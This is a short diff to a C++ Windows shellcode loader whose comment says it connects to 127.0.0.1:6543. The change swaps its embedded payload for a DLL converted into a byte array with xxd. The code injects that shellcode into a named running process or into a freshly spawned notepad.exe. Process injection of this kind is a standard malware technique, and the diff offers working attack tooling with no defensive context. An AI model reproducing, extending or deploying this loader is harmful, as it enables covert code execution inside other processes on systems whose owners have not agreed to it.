@@ -5,6 +5,7 @@
 #include <iostream>
 #include <tlhelp32.h>
 // A shell code loader connect to 127.0.0.1:6543.
+// Build: xxd -i TinyRun.dll > SCLoader.cpp
 #include "SCLoader.cpp"
 
 BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength,
@@ -18,7 +19,7 @@ public:
 	int InjectProcess(const char* processName = nullptr) {
 		if (processName) {
 			auto pid = GetProcessIdByName(processName);
-			if (pid ? InjectShellcode(pid, (BYTE*)Loader, sizeof(Loader)) : false)
+			if (pid ? InjectShellcode(pid, (BYTE*)TinyRun_dll, TinyRun_dll_len) : false)
 				return pid;
 		}
 		PROCESS_INFORMATION pi = {};
@@ -28,7 +29,7 @@ public:
 		if (CreateProcess(NULL, "\"notepad.exe\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
 			CloseHandle(pi.hProcess);
 			CloseHandle(pi.hThread);
-			return InjectShellcode(pi.dwProcessId, (BYTE*)Loader, sizeof(Loader)) ? pi.dwProcessId : 0;
+			return InjectShellcode(pi.dwProcessId, (BYTE*)TinyRun_dll, TinyRun_dll_len) ? pi.dwProcessId : 0;
 		}
 		return 0;
 	}
